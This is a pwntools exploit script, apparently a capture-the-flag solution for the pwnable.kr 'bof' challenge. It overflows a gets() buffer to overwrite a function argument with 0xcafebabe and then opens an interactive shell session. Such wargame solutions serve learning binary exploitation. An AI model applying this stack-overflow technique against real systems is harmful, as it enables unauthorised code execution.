from pwn import *

#Download : http://pwnable.kr/bin/bof

#context.update(arch="amd64", os="linux")

### Func() Stack Frame 
#
# args (0xdeedbeef): 4 Bytes
# return address: 4 Bytes
# old ebp: 4 Bytes
# actual ebp: 4 bytes
# (vars)
#   gets() -> ebp+0x2c (44 bytes)

debug = False

payload =  b""       # gets() buffer (ebp+0x2c)
payload += b"A" * 44 #
payload += b"B" * 4  # Old ebp
payload += b"C" * 4  # Return address
payload += p32(0xcafebabe) # Overflow the arg (0xdeadbeef)

p = process('./bof') 

if debug:
    pause()
    # Set breakpoints
    breakpoints = [
    #    "break gets",
        "break 0x56638654"
    ]
    
    # Start GDB and attach to the process
    gdb_cmd = "\n".join(breakpoints)
    gdb.attach(p, gdbscript=gdb_cmd)

    # Optionally, continue the execution after GDB attaches
    #p.sendline("continue")

#p = remote('pwnable.kr', '9000') #for remote connection
p.sendline(payload)
p.interactive()
